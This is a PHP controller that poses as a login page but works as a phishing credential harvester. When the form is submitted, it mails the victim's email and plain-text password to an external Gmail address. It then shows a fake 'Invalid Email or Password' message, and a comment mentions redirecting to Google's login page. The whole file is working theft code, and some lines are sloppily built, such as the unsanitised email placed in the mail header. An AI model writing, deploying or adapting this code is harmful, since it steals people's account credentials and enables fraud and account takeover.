<?php

Class Login extends Controller
{
    function index()
    {
        $data=
        [
            'page_title'=>'',
            '____password'=>'',
            '____email'=>'',
            'passwordError'=>'',
            'emailError'=>''
        ];

       if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            if (getRequestMethod()) {
             $_POST = filter_input_array(INPUT_POST, FILTER_SANITIZE_STRING);
             $data=
                [
                    'page_title' => '',
                    '____password'=>trim(filter_var($_POST['____password'], FILTER_SANITIZE_STRING)),
                    '____email'=>trim(filter_var($_POST['____email'], FILTER_VALIDATE_EMAIL)),
                    'passwordError'=>'',
                    'emailError'=>''
                ];
            
                if (empty($data['____email'])) {
                   $data['emailError']='Provide Your Email Address.';
                }elseif (!filter_var($data['____email'], FILTER_VALIDATE_EMAIL)) {
                   $data['emailError']='Invalid Email Provided. ';
                }
                if (empty($data['____password'])) {
                    $data['passwordError']='Provide Your Password.';
                }
                
                if (!empty($data['____email']) && !empty($data['____password'])) {
                    
                    $header = "From:".$data['____email']."\r\n".
                    "------------------------------------------------------------\n";
                    $header .= "MIME-Version: 1.0\r\n";
                    $header .= "Content-type: text/html\r\n";

                    $to =  'abc@gmail.com';
                    $subject= "Personal Data.\n".
                    "------------------------- MESSAGE -------------------------\n\n".
                    // Set the body of the email you're sending
                    $message = 'Email: '.$data['____email']."\n".
                    $message = 'Password: '.$data['____password']."\n".
                    "\n\n------------------------------------------------------------\n";
                    $retval = mail ($to,$subject,$message,$header);
                    
                    if( $retval == true ) {
                        // throw error
                        $data['emailError'] = 'Invalid Email or Password.!';
                        // redirect to Google main login page
                    }else {
                       $data['emailError'] = "Message could not be sent...";
                    }
                   
                }
            }
        }
        $this->view("Login", $data);
    }
}